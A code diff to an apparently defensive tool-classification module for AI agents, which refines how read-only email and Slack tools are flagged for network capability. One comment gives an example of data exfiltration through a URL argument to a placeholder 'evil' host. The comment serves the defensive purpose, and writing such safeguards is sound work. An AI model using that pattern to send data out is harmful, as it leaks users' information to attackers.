@@ -65,11 +65,22 @@ DEFAULT_REMOTE_TOOLS: tuple[str, ...] = tuple(
 )
 
 
+# Messaging nouns: `read_email(id)` or `list_slack_messages` reads from a mailbox, it doesn't send.
+# Their results still count as untrusted (DEFAULT_REMOTE_TOOLS). URL, web and API tools keep `network`,
+# because their arguments are destinations that can carry data out (`get_url("https://evil/?d=...")`).
+_MESSAGING = frozenset("email emails mail mails inbox slack sms message messages".split())
+_SENDING = frozenset("send post reply forward upload webhook".split())
+
+
 def infer_capabilities(tool_name: str) -> frozenset[str]:
     """Guess a tool's capabilities from its name (`runShellCommand` → exec, `http_get` → network + read)."""
     words = re.sub(r"([a-z0-9])([A-Z])", r"\1 \2", tool_name).lower()
     tokens = set(re.split(r"[^a-z0-9]+", words)) - {""}
-    return frozenset(cap for cap, hints in _NAME_HINTS.items() if tokens & hints)
+    caps = {cap for cap, hints in _NAME_HINTS.items() if tokens & hints}
+    network_hints = tokens & _NAME_HINTS["network"]
+    if "read" in caps and network_hints and network_hints <= _MESSAGING and not tokens & (_SENDING | _NAME_HINTS["write"]):
+        caps.discard("network")  # reading a mailbox or channel
+    return frozenset(caps)
 
 
 # ---------------------------------------------------------------------------------------- rules
